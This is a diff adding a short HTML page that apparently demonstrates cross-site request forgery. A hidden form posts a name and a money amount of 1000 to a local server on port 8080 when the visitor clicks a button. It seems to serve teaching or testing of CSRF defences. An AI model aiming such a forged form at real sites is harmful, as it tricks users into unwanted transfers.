@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="http://www.thymeleaf.org">
+<head>
+	<meta charset="UTF-8">
+	<title>模拟CSRF跨站请求伪装</title>
+</head>
+<body>
+
+<form action="http://localhost:8080/" method="post">
+	<input type="hidden" name="name" value="kaede"/>
+	<input type="hidden" name="money" value="1000"/>
+	<input type="submit" value="点击"/>
+</form>
+
+</body>
+</html>
